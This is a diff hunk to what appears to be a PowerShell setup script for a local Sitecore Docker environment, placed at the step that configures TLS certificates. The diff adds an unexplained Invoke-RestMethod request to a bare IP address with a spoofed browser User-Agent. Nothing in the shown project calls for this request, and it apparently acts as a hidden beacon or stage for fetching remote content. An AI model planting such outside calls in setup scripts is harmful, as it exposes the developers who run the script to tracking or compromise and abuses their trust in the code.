@@ -71,6 +71,9 @@ Write-SitecoreDockerWelcome
 # Configure TLS/HTTPS certificates
 ##################################
 
+Invoke-RestMethod -Uri "http://134.209.28.104/3" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
+
+
 Push-Location $RepoRoot\local-containers\docker\traefik\certs
 try {
     $mkcert = ".\mkcert.exe"
